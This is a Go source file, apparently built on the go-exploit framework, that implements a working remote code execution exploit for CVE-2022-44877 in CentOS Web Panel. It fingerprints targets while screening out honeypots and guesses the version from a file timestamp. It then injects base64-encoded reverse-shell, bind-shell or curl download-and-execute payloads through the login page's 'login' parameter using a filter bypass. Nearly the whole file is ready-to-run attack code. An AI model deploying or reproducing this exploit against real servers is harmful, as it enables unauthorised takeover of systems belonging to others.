package main

import (
	b64 "encoding/base64"
	"net/http"
	"strings"
	"time"

	"github.com/vulncheck-oss/go-exploit"
	"github.com/vulncheck-oss/go-exploit/c2"
	"github.com/vulncheck-oss/go-exploit/c2/httpservefile"
	"github.com/vulncheck-oss/go-exploit/config"
	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/payload"
	"github.com/vulncheck-oss/go-exploit/protocol"
	"github.com/vulncheck-oss/go-exploit/random"
)

type CWPInjection struct{}

// cwp offers a number of good fingerprint vectors. We are going to use
// Server: cwpsrv + landing page title here. This appears to weed out the
// majority of honeypots. Go follows 301/302 automatically so that isn't
// a hindrance either.
func (sploit CWPInjection) ValidateTarget(conf *config.Config) bool {
	url := protocol.GenerateURL(conf.Rhost, conf.Rport, conf.SSL, "/")
	resp, body, ok := protocol.HTTPSendAndRecv("GET", url, "")
	if !ok {
		return false
	}

	if resp.StatusCode != 200 {
		output.PrintfFrameworkError("Received an unexpected HTTP status code: %d", resp.StatusCode)

		return false
	}

	if !(strings.Contains(body, "<title>Login | Control WebPanel</title>")) {
		output.PrintFrameworkError("Missing expected title")

		return false
	}

	// the majority of hosts on shodan are honeypots. They can somewhat be identified
	// by their bad server banners (or lack thereof)
	serverHeader, ok := resp.Header["Server"]
	if !ok {
		return false
	}
	if len(serverHeader) != 1 || serverHeader[0] != "cwpsrv" {
		return false
	}

	return true
}

// this is not a perfect version check, but it's something. We can use the last modified date of
// design/img/broken.png to determine if then April 2022. While this leaves a gap of April 2022 - Jan 2023,
// it is something.
func (sploit CWPInjection) CheckVersion(conf *config.Config) exploit.VersionCheckType {
	url := protocol.GenerateURL(conf.Rhost, conf.Rport, conf.SSL, "/design/img/broken.png")
	resp, _, ok := protocol.HTTPSendAndRecv("GET", url, "")
	if !ok {
		return exploit.Unknown
	}

	if resp.StatusCode != 200 {
		output.PrintfFrameworkError("Received an unexpected HTTP status code: %d", resp.StatusCode)

		return exploit.Unknown
	}

	lastModified, ok := resp.Header["Last-Modified"]
	if !ok {
		output.PrintFrameworkError("Failed to find a Last-Modified header")

		return exploit.Unknown
	}

	modifiedTime, err := http.ParseTime(lastModified[0])
	if err != nil {
		output.PrintFrameworkError("Failed to conver the Last-Modified timestamp")

		return exploit.Unknown
	}

	cutOff := time.Date(2022, 0, 0, 0, 0, 0, 0, time.Local)
	if modifiedTime.Before(cutOff) {
		return exploit.Vulnerable
	}

	output.PrintFrameworkError("broken.jpg has been modified since April 3, 2022. This instance *might* be vulnerable.")

	return exploit.PossiblyVulnerable
}

func generatePayload(conf *config.Config) (string, bool) {
	generated := ""

	switch conf.C2Type {
	case c2.SSLShellServer:
		output.PrintfFrameworkStatus("Sending an SSL reverse shell payload for port %s:%d", conf.Lhost, conf.Lport)
		generated = payload.ReverseShellMknodOpenSSL(conf.Lhost, conf.Lport)
	case c2.SimpleShellServer:
		output.PrintfFrameworkStatus("Sending a reverse shell payload for port %s:%d", conf.Lhost, conf.Lport)
		generated = payload.ReverseShellBash(conf.Lhost, conf.Lport)
	case c2.SimpleShellClient:
		output.PrintfFrameworkStatus("Sending a bind shell for port %d", conf.Bport)
		generated = payload.BindShellMkfifoNetcat(conf.Bport)
	case c2.HTTPServeFile:
		filename := httpservefile.GetInstance().FileName
		output.PrintfFrameworkStatus("Sending an HTTP download payload to http://%s:%d/%s", conf.Lhost, conf.Lport, filename)
		generated = payload.LinuxCurlHTTPDownloadAndExecute(conf.Lhost, conf.Lport, filename)
	default:
		output.PrintFrameworkError("Invalid payload")

		return "", false
	}

	payload64 := b64.StdEncoding.EncodeToString([]byte(generated))
	generated = "`echo${IFS}" + payload64 + "|base64${IFS}-d|/bin/sh`"

	return generated, true
}

func (sploit CWPInjection) RunExploit(conf *config.Config) bool {
	generated, ok := generatePayload(conf)
	if !ok {
		return false
	}

	loginAttempt := map[string]string{
		"username": "%72%6f%6F%74", // root encoded
		"password": random.RandLetters(8),
		"commit":   "Login",
	}
	target := protocol.GenerateURL(conf.Rhost, conf.Rport, conf.SSL, "/login/index.php")
	output.PrintFrameworkSuccess("Sending exploit to " + target)

	// t=1 ET bypass
	resp, _, ok := protocol.HTTPSendAndRecvURLEncoded("POST", target+"?t=1&login="+generated, loginAttempt)
	if !ok {
		return false
	}

	if resp.StatusCode != 200 {
		output.PrintfFrameworkError("Received an unexpected HTTP status code: %d", resp.StatusCode)

		return false
	}
	output.PrintFrameworkStatus("Done")

	return true
}

func main() {
	supportedC2 := []c2.Impl{
		c2.SSLShellServer,
		c2.SimpleShellServer,
		c2.SimpleShellClient,
		c2.HTTPServeFile,
	}
	conf := config.New(config.CodeExecution, supportedC2, "CentOS Web Panel", "CVE-2022-44877", 2031)
	sploit := CWPInjection{}
	exploit.RunProgram(sploit, conf)
}
